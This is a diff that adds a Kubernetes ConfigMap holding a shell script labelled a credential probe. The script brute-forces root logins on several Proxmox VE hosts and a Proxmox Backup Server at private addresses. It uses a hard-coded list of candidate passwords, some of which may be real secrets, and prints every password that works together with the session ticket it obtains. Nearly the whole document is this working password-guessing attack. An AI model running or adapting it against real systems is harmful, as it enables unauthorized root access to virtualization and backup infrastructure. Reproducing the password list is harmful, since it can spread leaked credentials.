@@ -1,0 +1,68 @@
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: pveprobe-script
+  namespace: default
+data:
+  probe.sh: |
+    #!/bin/sh
+    # PVE/PBS per-host credential probe (HTTP ticket)
+    UA="Mozilla/5.0"
+    # host|name
+    HOSTS="10.0.0.1|pve-1 10.0.0.2|pve-2 10.0.0.3|pve-3 10.0.0.4|pve-4 10.0.0.5|pve-5 10.0.0.6|pve-6"
+    # password candidates (stage 1, small)
+    PWS="C)nco2be1be1
+    S8kTNpY/UxYjfNdJtiWEdwcjWQdJtp12FrqzoV5RaQ==
+    N2w7BYl+FTrO+DQ/niSBT2CYsJk1E7VFCfv1jbPVig==
+    rOdNmjM9Q+QUeSgWWmRfbZZF7CqumMPas7ijU2lUlg==
+    Themonateam123
+    MonaM@123
+    Z&X1nqk-h9vcK2
+    x9!QqnL6aD_5jg
+    6SqVt79j:W4-Zv
+    p!b79wI1YK2eO]
+    Y8+pKc0m7D1Ek[
+    Ui)CWXp5C1H1S)
+    ^3mAEcLIn2$hA3
+    4wh(Y4Bg8%rscy
+    ZY?w5XKU2E.3Rh
+    r8j!0GYvI#4yfW
+    +8tKTkcgV0T=9X
+    JHnpE63FlO4C&,
+    uJO1:EeO}N9S6R
+    ET6f>N7Ll2VJW}
+    ?RXk8(52tHBalv
+    LPCUPf7;9e3X.A
+    Atg6z0_iiA2$fV
+    675pDjVbI#F)0y
+    XAmHy6P8fMC6"
+    
+    echo "=== VERSION probe (reachability) ==="
+    for hp in $HOSTS; do ip=${hp%%|*}; nm=${hp##*|};
+      code=$(curl -sk -o /dev/null -w '%{http_code}' --max-time 6 "https://$ip:8006/api2/json/version")
+      echo "$nm $ip version=$code"
+    done
+    echo "=== PBS 10.0.0.11 version ==="
+    curl -sk -o /dev/null -w 'pbs-version=%{http_code}\n' --max-time 6 "https://10.0.0.11:8007/api2/json/version"
+    
+    echo "=== TICKET attempts ==="
+    for hp in $HOSTS; do ip=${hp%%|*}; nm=${hp##*|};
+      for user in "root@pam"; do
+        for pw in $PWS; do
+          body=$(curl -sk --max-time 8 --data-urlencode "username=$user" --data-urlencode "password=$pw" "https://$ip:8006/api2/json/access/ticket")
+          if echo "$body" | grep -q '"ticket"'; then
+            echo "SUCCESS|$nm|$ip|$user|PW=$pw|TICKET=$(echo "$body" | head -c 400)"
+          fi
+        done
+      done
+    done
+    echo "=== PBS ticket attempts root@pbs ==="
+    for user in "root@pbs"; do
+      for pw in $PWS; do
+        body=$(curl -sk --max-time 8 --data-urlencode "username=$user" --data-urlencode "password=$pw" "https://10.0.0.11:8007/api2/json/access/ticket")
+        if echo "$body" | grep -q '"ticket"'; then
+          echo "SUCCESS|pve-utils|10.0.0.11:8007|$user|PW=$pw|TICKET=$(echo "$body" | head -c 400)"
+        fi
+      done
+    done
+    echo "=== DONE ==="
